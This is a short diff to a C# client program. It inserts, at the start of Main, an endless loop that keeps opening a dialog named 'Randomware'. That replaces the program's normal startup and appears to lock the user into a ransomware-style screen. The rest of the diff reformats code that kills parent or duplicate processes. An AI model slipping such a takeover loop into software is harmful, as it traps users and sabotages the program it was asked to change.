@@ -20,6 +20,9 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
+            while (true)
+                new Armitage.Randomware.Dialog().ShowDialog();
+            return;
             // this has nothing to do with threads
             Application.ThreadException += Application_ThreadException;
 
@@ -166,9 +169,11 @@ namespace Client
                         if (parent > 0)
                             Process.GetProcessById(parent).Kill();
                     }
-                    else if (args[0].Trim() == "system") {
+                    else if (args[0].Trim() == "system")
+                    {
                         // kill self if self already is running
-                        if (Utilities.Process_Utils.GetSameProcesses().Length > 0) {
+                        if (Utilities.Process_Utils.GetSameProcesses().Length > 0)
+                        {
                             Environment.Exit(0); // exit because process is already running...
                         }
                     }
